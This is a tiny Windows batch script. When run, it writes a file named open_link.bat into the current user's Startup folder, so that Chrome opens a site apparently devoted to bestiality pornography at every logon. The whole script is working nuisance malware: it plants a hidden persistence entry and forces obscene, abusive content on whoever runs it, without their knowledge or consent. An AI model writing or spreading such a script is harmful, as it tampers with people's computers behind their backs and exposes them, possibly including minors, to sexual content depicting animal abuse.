@echo off
setlocal
set "path=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

set "file_name=open_link.bat"

set "path_file=%path%\%file_name%"

echo start chrome https://www.zooporn.show > "%path_file%"

